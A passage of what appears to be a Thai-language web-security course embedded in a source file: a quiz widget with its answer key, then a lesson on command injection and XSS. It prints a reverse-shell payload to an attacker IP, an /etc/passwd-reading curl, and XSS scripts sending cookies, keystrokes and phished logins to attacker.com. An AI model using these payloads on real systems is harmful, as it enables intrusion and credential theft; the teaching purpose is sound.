  .mq-gauge-col {width:100%; border-left:none; padding-left:0; border-top:1px solid rgba(255,255,255,0.06); padding-top:24px;}
}
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:url(#gauge-grad-178); stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease; filter:drop-shadow(0 0 5px rgba(0,240,255,0.4));}
.neon-gauge-text {fill:#ffffff; font-family:'JetBrains Mono',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}

.mq-q{margin-bottom:20px;}
.mq-title{font-size:0.9rem;font-weight:800;color:#e2e8f0;margin-bottom:10px;}
.mq-title span{color:#00f0ff;font-family:'JetBrains Mono',monospace;margin-right:6px;}
.mini-opts{display:flex;flex-direction:column;gap:6px;}
.mini-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.05);border-radius:8px;cursor:pointer;transition:all 0.15s ease;user-select:none;font-size:0.83rem;color:#cbd5e1;}
.mini-opt:hover{border-color:rgba(0,240,255,0.2);background:rgba(0,240,255,0.02);}
.mini-opt.selected{border-color:#00f0ff;background:rgba(0,240,255,0.08);color:#ffffff;}
.mini-opt.correct{border-color:#3ddc84;background:rgba(61,220,132,0.08);color:#ffffff;}
.mini-opt.incorrect{border-color:#ff007f;background:rgba(255,0,127,0.08);color:#ffffff;}
.mini-bullet{width:15px;height:15px;border:1px solid rgba(255,255,255,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.58rem;font-weight:bold;}
.mini-opt.selected .mini-bullet{border-color:#00f0ff;background:#00f0ff;color:#070910;}

.mq-btn-check{padding:10px 20px;background:#00f0ff;border:none;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:800;color:#070910;cursor:pointer;box-shadow:0 0 10px rgba(0,240,255,0.25);transition:all 0.15s ease;}
.mq-btn-check:hover{background:#ffffff;box-shadow:0 0 15px rgba(255,255,255,0.4);transform:translateY(-1px);}
.mq-status-bar{display:none;padding:12px 16px;border-radius:8px;font-size:0.85rem;margin-top:16px;font-weight:700;line-height:1.5;}
</style>

<div id="mq-box-178" class="mini-quiz-box">
<div class="mq-layout-container">
<div class="mq-questions-col">
<!-- Question 1 -->
<div class="mq-q" data-correct="B">
<div class="mq-title"><span>Q1.</span> ช่องโหว่ประเภทใดเกิดขึ้นจากการที่เซิร์ฟเวอร์นำอินพุตของผู้ใช้ไปเรียกประมวลผลเป็นคำสั่งระบบปฏิบัติการโดยตรง?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> SQL Injection</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> Command Injection</div>
<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> Cross-Site Scripting (XSS)</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> Local File Inclusion (LFI)</div>
</div>
</div>

<!-- Question 2 -->
<div class="mq-q" data-correct="B">
<div class="mq-title"><span>Q2.</span> คิวรีเป้าหมายพิเศษระดับมาตรฐาน ' OR 1=1 -- นิยมใช้ส่งเข้าไปในฐานข้อมูลเพื่อทำลายเงื่อนไขข้อใด?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> ขโมยดูข้อมูลทั้งหมด (Data Exfiltration)</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> ข้ามขั้นตอนตรวจสอบยืนยันตน (Bypass Authentication)</div>
<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> ทำลายเซิร์ฟเวอร์ระบบล่ม (Denial of Service)</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> ค้นหารหัสผ่านระบบ (Password Cracking)</div>
</div>
</div>

<button class="mq-btn-check" onclick="checkMiniQuiz178(178)">Check Answers / ตรวจคำตอบ</button>
<div id="mq-status-178" class="mq-status-bar"></div>
</div>

<div class="mq-gauge-col">
  <span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em; text-align:center;">Lesson Progress</span>
  <div class="neon-gauge-container">
    <svg class="neon-gauge" viewBox="0 0 36 36">
      <defs>
        <linearGradient id="gauge-grad-178" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#ff007f" />
          <stop offset="50%" stop-color="#fbbf24" />
          <stop offset="100%" stop-color="#00f0ff" />
        </linearGradient>
      </defs>
      <path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <path class="neon-gauge-fill" id="lesson-gauge-fill-178" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text-178">0%</text>
    </svg>
  </div>
  <span id="lesson-status-txt-178" class="mt-3 d-block text-muted" style="font-size:0.78rem; text-align:center;">โปรดตอบคำถามให้ครบ 2 ข้อ</span>
</div>
</div>
</div>

<script>
document.querySelectorAll('#mq-box-178 .mini-opt').forEach(function(opt) {
  opt.addEventListener('click', function() {
    var parent = this.closest('.mq-q');
    parent.querySelectorAll('.mini-opt').forEach(function(o) { o.classList.remove('selected'); });
    this.classList.add('selected');
    updateMiniProgress178(178);
  });
});

function updateMiniProgress178(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var qGroups = box.querySelectorAll('.mq-q');
  var answeredCount = 0;
  qGroups.forEach(function(g) {
    if (g.querySelector('.mini-opt.selected')) {
      answeredCount++;
    }
  });
  var pct = Math.round((answeredCount / qGroups.length) * 100);
  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status = document.getElementById('lesson-status-txt-' + lnum);
  if (fill) fill.setAttribute('stroke-dasharray', pct + ', 100');
  if (text) text.textContent = pct + '%';
  if (status) {
    if (pct === 100) {
      status.innerHTML = '<span style="color:#00f0ff; font-weight:bold;">กรุณากดตรวจคำตอบ</span>';
    } else if (pct > 0) {
      status.textContent = 'ตอบคำถามแล้ว ' + answeredCount + '/' + qGroups.length + ' ข้อ';
    } else {
      status.textContent = 'โปรดตอบคำถามให้ครบ 2 ข้อ';
    }
  }
}

function checkMiniQuiz178(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var groups = box.querySelectorAll('.mq-q');
  var score = 0;
  var allAnswered = true;
  groups.forEach(function(g) {
    if (!g.querySelector('.mini-opt.selected')) allAnswered = false;
  });
  if (!allAnswered) {
    alert("กรุณาตอบคำถามท้ายบทให้ครบถ้วนทั้ง 2 ข้อก่อนส่งตรวจคำตอบครับ!");
    return;
  }
  groups.forEach(function(g) {
    var correctVal = g.getAttribute('data-correct');
    var selected = g.querySelector('.mini-opt.selected');
    var selectedVal = selected.getAttribute('data-val');
    g.querySelectorAll('.mini-opt').forEach(function(o) {
      o.classList.remove('correct', 'incorrect');
      var val = o.getAttribute('data-val');
      if (val === correctVal) {
        o.classList.add('correct');
      } else if (o.classList.contains('selected')) {
        o.classList.add('incorrect');
      }
    });
    if (selectedVal === correctVal) score++;
  });

  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status_txt = document.getElementById('lesson-status-txt-' + lnum);
  var status = document.getElementById('mq-status-' + lnum);
  status.style.display = 'block';

  if (score === 2) {
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
    
    localStorage.setItem('solved_lesson_178', 'solved');
    if (typeof updateProgressUI === 'function') updateProgressUI();
    groups.forEach(function(g) {
      g.querySelectorAll('.mini-opt').forEach(function(o) {
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
  } else {
    var errorPct = Math.round((score / groups.length) * 100);
    if (fill) { fill.setAttribute('stroke-dasharray', errorPct + ', 100'); fill.style.stroke = '#ff007f'; }
    if (text) text.textContent = errorPct + '%';
    if (status_txt) status_txt.textContent = 'ตอบไม่ถูกต้อง ลองใหม่!';

    status.style.background = 'rgba(255,0,127,0.08)';
    status.style.border = '1px solid rgba(255,0,127,0.25)';
    status.style.color = '#ff007f';
    status.innerHTML = '❌ <strong>ยังไม่ผ่าน!</strong> คุณได้คะแนน ' + score + '/2 (ทำข้อสอบไม่จบตาม Gauge Bar Progress) กรุณาทบทวนบทเรียนและตรวจเลือกคำตอบใหม่อีกครั้ง';
  }
}

setTimeout(function() {
  var solved = localStorage.getItem('solved_lesson_178');
  if (solved === 'solved') {
    var box = document.getElementById('mq-box-178');
    var groups = box.querySelectorAll('.mq-q');
    groups.forEach(function(g) {
      var correctVal = g.getAttribute('data-correct');
      g.querySelectorAll('.mini-opt').forEach(function(o) {
        var val = o.getAttribute('data-val');
        if (val === correctVal) {
          o.classList.add('selected', 'correct');
        }
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
    
    var fill = document.getElementById('lesson-gauge-fill-178');
    var text = document.getElementById('lesson-gauge-text-178');
    var status_txt = document.getElementById('lesson-status-txt-178');
    var status = document.getElementById('mq-status-178');
    
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.display = 'block';
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
  }
}, 200);
</script>
"""

# ─── Lesson 179 ───
val179_0 = """## 🎭 Web Exploitation Deep Dive (เจาะลึกช่องโหว่เว็บระดับก้าวหน้า)
---

ยินดีต้อนรับสู่บทเรียนเจาะลึกประเภทการโจมตีทางเว็บ: Command Injection, Cross-Site Scripting (XSS), File Inclusion และ Brute Force Attacks พร้อมเทคนิคการทำงานร่วมกับเครื่องมือและสคริปต์เจาะระบบ

### 📄 SLIDE 121-125: Command Injections: Payloads ( Linux & Windows )
ตารางรวบรวมคำสั่ง Payload ที่ใช้ทดสอบช่องโหว่เพื่อรันคำสั่งบนระบบปฏิบัติการผ่านเว็บเบราว์เซอร์:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 12px; font-weight: bold; width: 220px;">สัญลักษณ์/Payload</th>
<th style="padding: 12px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
<th style="padding: 12px; font-weight: bold; width: 150px;">ระบบปฏิบัติการ</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; ls -l</td>
<td style="padding: 12px;">สั่งให้รันคำสั่งแสดงรายละเอียดไฟล์ (ls) หลังคำสั่งแรกทำงานเสร็จ</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; id</td>
<td style="padding: 12px;">สั่งรันเพื่อดูข้อมูลผู้ใช้งานปัจจุบัน (User ID, Group ID)</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">&amp; whoami</td>
<td style="padding: 12px;">ใช้ตัวเชื่อม <code>&amp;</code> เพื่อสั่งแสดงชื่อผู้ใช้อัตโนมัติ (นิยมใช้หากเซิร์ฟเวอร์บล็อกเครื่องหมาย <code>;</code>)</td>
<td style="padding: 12px; color: #fb7185;">Linux / Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">&amp; echo vulnerable</td>
<td style="padding: 12px;">พิมพ์แสดงข้อความประเมินเบื้องต้นว่าเว็บสามารถรันคำสั่งได้หรือไม่</td>
<td style="padding: 12px; color: #fb7185;">Linux / Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">`cat /etc/passwd`</td>
<td style="padding: 12px;">สั่งดึงไฟล์รายชื่อบัญชีผู้ใช้ในระบบ Linux ด้วยการใช้เครื่องหมาย Backticks</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">$(whoami)</td>
<td style="padding: 12px;">แทรกรันคำสั่งแสดงชื่อผู้ใช้แบบครอบสัญลักษณ์เพื่อเลี่ยงตัวกรองคัดกรองอักขระ</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">$(cat /etc/passwd)</td>
<td style="padding: 12px;">แทรกดึงไฟล์ผู้ใช้อัตโนมัติด้วยคำสั่งผ่านสัญลักษณ์ดักจับเพื่อเลี่ยงตัวกรอง</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; nc -e /bin/sh &lt;ATTACKER_IP&gt; 4444</td>
<td style="padding: 12px;">คำสั่งสร้าง Reverse Shell เชื่อมต่อ Terminal สิทธิ์เครื่องเซิร์ฟเวอร์กลับไปหาแฮกเกอร์</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; net user Administrator /domain</td>
<td style="padding: 12px;">สั่งตรวจสอบแสดงรายชื่อผู้ดูแลระบบในตาราง AD Windows Server</td>
<td style="padding: 12px; color: #fbbf24;">Windows</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 126-130: ตัวอย่างจริงของการยิงเจาะระบบผ่าน Command Injections

#### 💻 1. โค้ดภาษา PHP บนเซิร์ฟเวอร์ที่มีช่องโหว่ (Vulnerable PHP Source)
```php
<?php
    // รับค่าพารามิเตอร์ 'cmd' จากผู้ใช้โดยตรง
    $cmd = $_GET['cmd'];
    
    // เรียกใช้งานคำสั่งระดับระบบปฏิบัติการโดยไม่มีการตรวจสอบหรือหลีกเลี่ยงอักขระพิเศษ
    system("ping -c 1 " . $cmd);
?>
```

#### 🌐 2. การโจมตีผ่านบราวเซอร์ (Web Browser Injection Examples)
แฮกเกอร์สามารถส่ง Payload บายพาสต่อหลังคำสั่ง Ping ได้ดังนี้:
- **ดูชื่อผู้ใช้งานของระบบ**:
  `http://target.com/vuln.php?cmd=;whoami`
- **ดูรหัสประจำตัวผู้รัน**:
  `http://target.com/vuln.php?cmd=$(id)`
- **ดึงรายชื่อไฟล์ทั้งหมด (แบบ URL-encoded ช่องว่าง)**:
  `http://target.com/vuln.php?cmd=;%20ls%20-l`  *(มีค่าเท่ากับ `; ls -l`)*

#### 🐚 3. การโจมตีและขโมยข้อมูลโดยใช้โปรแกรม Bash (cURL POST Method)
แฮกเกอร์สามารถใช้คำสั่ง Terminal บนเครื่องตนเองเพื่อยิงดึงไฟล์ระบบของเป้าหมายและส่งค่ากลับผ่าน HTTP POST:
```bash
curl -X POST -d "cmd=$(cat /etc/passwd)" http://target.com/vuln.php
```

---

### 📄 SLIDE 131-135: Cross-Site Scripting (XSS) Introduction
- **คำจำกัดความ**: Cross-Site Scripting (XSS) คือหนึ่งในภัยคุกคามฝั่ง Client-Side เกิดขึ้นเมื่อผู้พัฒนาละเลยการคัดกรองหรือแปลงอักขระพิเศษในอินพุต ปล่อยให้ผู้ประสงค์ร้ายสามารถแทรกโค้ดสคริปต์ประสงค์ร้าย (โดยมากมักเขียนด้วยภาษา **JavaScript**) เข้าสู่หน้าเพจของเว็บแอปพลิเคชัน
- **เป้าหมายและผลกระทบ**: เมื่อมีผู้ใช้งานทั่วไปโหลดหน้าเพจนั้น สคริปต์จะถูกเรียกทำงานบนเบราว์เซอร์ของเหยื่อทันที เพื่อดึงคีย์ตรวจสอบสิทธิ์ (Session Tokens), คุกกี้ความลับ (Cookies), ขโมยรหัสผ่าน หรือทำธุรกรรมปลอมในนามของเหยื่อ
- **ศึกษาประเด็นเพิ่มเติม**: [Cross-Site Scripting Web Application Security](https://www.spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/)

---

### 📄 SLIDE 136-140: ประเภทของช่องโหว่ Cross-Site Scripting (XSS)

#### 🎭 1. Stored XSS (Persistent XSS - แบบบันทึกถาวร)
- **หลักการ**: โค้ดสคริปต์ประสงค์ร้ายจะถูกส่งเข้าไป **บันทึกเก็บไว้ในฐานข้อมูล (Database)** ของเซิร์ฟเวอร์โดยตรง (เช่น ในกล่องข้อความเว็บบอร์ด, ความคิดเห็น, รายละเอียดสินค้า)
- เมื่อมีผู้ใช้งานคนอื่นเปิดเข้ามาชมหน้านั้นในอนาคต สคริปต์จะทำงานบนบราวเซอร์ของพวกเขาทุกครั้งแบบอัตโนมัติ
- **ตัวอย่าง Payload**:
  ```html
  <script>alert('Stored XSS Vulnerable!');</script>
  ```

#### 🎭 2. Reflected XSS (Non-Persistent XSS - แบบสะท้อนกลับ)
- **หลักการ**: สคริปต์แนบมาเป็น **ส่วนหนึ่งของ URL ลิงก์หรือพารามิเตอร์คำสั่งขอใช้งาน (Request)** เมื่อเซิร์ฟเวอร์นำข้อมูลอินพุตจาก URL นั้นกลับมาวาดหน้าเว็บตอบกลับทันทีโดยไม่ได้เก็บบันทึกในระบบ
- **ตัวอย่างลิงก์โจมตี**:
  `http://target.com/search?q=<script>alert('Reflected XSS');</script>`
- หากผู้ใช้กดคลิกลิงก์ที่แฮกเกอร์แนบมานี้ โค้ดประสงค์ร้ายจะทำงานในเครื่องของเหยื่อทันที

#### 🎭 3. DOM-Based XSS (แบบปรับแก้โครงสร้างเอกสารเว็บ)
- **หลักการ**: เกิดขึ้นบนฝั่งเครื่องผู้รับบริการโดยตรง (Client-Side JavaScript) โดยสคริปต์ที่แฮกเกอร์ส่งเข้ามาจะเข้าไปแก้ไขวัตถุใน **DOM (Document Object Model)** ของหน้าเว็บขณะที่ทำงาน โดยไม่มีการส่งข้อมูลหรือติดต่อคุยกับเว็บเซิร์ฟเวอร์หลังบ้านเลย
- **ตัวอย่างช่องโหว่**: หน้าเว็บรับค่าจาก Hash URL มาแสดงผลโดยตรง:
  `http://target.com/#<script>alert('DOM XSS')</script>`

---

### 📄 SLIDE 141-145: Common XSS Payloads Cheatsheet (ตารางรวบรวมคีย์เจาะระบบ XSS)
รายการ Payload ยอดนิยมในการทดสอบระบบความปลอดภัยเพื่อตรวจสอบความรัดกุมของหน้าเว็บ:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 320px;">คีย์เจาะระบบ XSS (Payload)</th>
<th style="padding: 10px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
<td style="padding: 10px;">การเรียกใช้งานคำสั่งพื้นฐานส่งข้อความแจ้งเตือนป๊อปอัพยืนยันช่องโหว่</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
<td style="padding: 10px;">การส่งเครื่องหมายปิดคุณสมบัติเพื่อปิดแท็ก HTML เก่าก่อนหน้า แล้วบังคับแทรกแท็ก script ใหม่เข้ามาทำงาน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">&lt;img src=x onerror=alert('XSS')&gt;</td>
<td style="padding: 10px;">การใช้รูปภาพที่ไม่มีอยู่จริงเพื่อกระตุ้นให้เกิดเหตุการณ์ผิดพลาด (onerror) แล้วรันคำสั่งแฝง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">&lt;svg/onload=alert('XSS')&gt;</td>
<td style="padding: 10px;">การแทรกโค้ดแบบใช้แท็กกราฟิก SVG เพื่อหลบเลี่ยงการดักจับข้อความคำว่า "script"</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</td>
<td style="padding: 10px;">แทรกหน้าเอกสารกรอบ iframe ย่อยและสั่งให้ประมวลผลสคริปต์ในตำแหน่งต้นทางของกรอบ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">&lt;input type="text" onfocus="alert('XSS')" autofocus&gt;</td>
<td style="padding: 10px;">การใช้ช่องกรอกข้อมูลที่จะทำการโฟกัสอัตโนมัติ (onfocus) เพื่อสั่งรันคำสั่งโดยผู้ใช้ไม่ต้องขยับเมาส์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #10b981;">&lt;body onload=alert('XSS')&gt;</td>
<td style="padding: 10px;">สั่งให้โค้ดประมวลผลทันทีที่ตัวเว็บและรายละเอียดในหน้าโหลดโครงสร้างเสร็จสิ้น</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08)">
<td style="padding: 10px; font-family: monospace; color: #10b981;">&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</td>
<td style="padding: 10px;">การฝังสคริปต์ไว้ในลิงก์เชื่อมโยง เพื่อหลอกล่อให้เหยื่อคลิกเข้ามาเรียกใช้งานคำสั่ง</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 146-150: XSS Scenario: Real-world Attacking Scenarios (ตัวอย่างภัยพิบัติที่แฮกเกอร์นำไปใช้จริง)

#### 🟢 1. การดักจับขโมยเซสชันคุกกี้ (Session Hijacking & Cookie Stealing)
สคริปต์สแกนหาข้อมูลคุกกี้สิทธิ์ของผู้ใช้เพื่อทำการแอบส่งออกไปยังเซิร์ฟเวอร์เก็บข้อมูลของแฮกเกอร์:
```html
<script>
    document.location='http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

#### 🟢 2. การฝังสปายดักจับแป้นพิมพ์ป้อนข้อมูล (Keylogging Attack)
การลอบดักจับทุกการกดปุ่มของเหยื่อบนแป้นพิมพ์เพื่อขโมยรหัสผ่านหรือข้อมูลบัตรเครดิตขณะกรอกเว็บ:
```html
<script>
    document.onkeypress = function(e) {
        fetch('http://attacker.com/log.php?key=' + encodeURIComponent(e.key));
    };
</script>
```

#### 🟢 3. การสร้างแบบฟอร์มยืนยันตัวตนปลอมเพื่อตกเหยื่อ (Phishing Attack)
การเขียนสคริปต์ทับโครงสร้างหน้าเว็บปัจจุบันเพื่อวาดแบบฟอร์มขอรหัสผ่านส่งหาแฮกเกอร์:
```html
<script>
    document.body.innerHTML = '<h2>Session Expired. Please log in again.</h2>' +
      '<form action="http://attacker.com/collect.php" method="POST">' +
      'Username: <input type="text" name="user" required><br>' +
      'Password: <input type="password" name="pass" required><br>' +
      '<input type="submit" value="Login"></form>';
</script>
```

---

### 📄 SLIDE 151-160: Automated XSS Tool: XSStrike (เครื่องมือสแกนหา XSS อัจฉริยะ)
**XSStrike** คือเครื่องมือสแกนช่องโหว่ Cross-Site Scripting (XSS) ยอดนิยมระดับโลก พัฒนาขึ้นมาด้วยภาษา Python:
- มีความฉลาดลึกซึ้งกว่าเครื่องมือสแกนแบบสุ่มทั่วไป เนื่องจากจะทำการจำแนกและวิเคราะห์ความปลอดภัยในการตอบสนองของเว็บไซต์เป้าหมาย แล้วสุ่มพัฒนาสร้าง Payload เฉพาะขึ้นมาเจาะระบบเพื่อ bypass ระบบคัดกรองความปลอดภัย (WAF Bypass)
- **การติดตั้งเรียกใช้งาน**:
  ```bash
  # 1. โคลนคลังโค้ดจากกิตฮับมาเก็บลงระบบ
  git clone https://github.com/s0md3v/XSStrike.git
  
  # 2. ย้ายโฟลเดอร์เข้าไปยังสคริปต์เรียกใช้งาน
  cd XSStrike
  
  # 3. ติดตั้งไลบรารีอ้างอิงที่จำเป็นของระบบ
  pip3 install -r requirements.txt
  
  # 4. เรียกใช้งานเครื่องมือสแกน
  python3 xsstrike.py --help
  ```

#### 🛠️ ตารางสรุปออปชันคำสั่งของ XSStrike (Cheatsheet)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 180px;">คำสั่ง (Option)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">-u &lt;URL&gt;</td>
<td style="padding: 10px;">กำหนดลิงก์เว็บไซต์เป้าหมายที่ต้องการสแกนหา XSS (เช่น <code>-u "http://target.com/search.php?q=test"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--auto</td>
<td style="padding: 10px;">สั่งรันระบบประมวลผลและทดสอบยิงเจาะหาผลลัพธ์แบบอัตโนมัติทั้งหมด</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--params</td>
<td style="padding: 10px;">สแกนตรวจสอบพารามิเตอร์นำเข้าและฟิลด์ทั้งหมดที่มีอยู่จริงของหน้านั้น</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--fuzz</td>
<td style="padding: 10px;">รันโหมดสุ่มส่งโค้ดพิเศษ เพื่อตรวจสอบผลการประมวลผลสำหรับ WAF Bypass</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--file &lt;filepath&gt;</td>
<td style="padding: 10px;">สั่งสแกนตรวจสอบรายการเป้าหมายหลายพิกัดจากไฟล์บันทึกรายการรายชื่อลิงก์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--data "&lt;DATA&gt;"</td>
<td style="padding: 10px;">ทดสอบวิเคราะห์ช่องโหว่ความมั่นคงในรูปแบบข้อมูลที่ส่งผ่าน POST method</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #a7f3d0;">--cookie "&lt;COOKIE&gt;"</td>
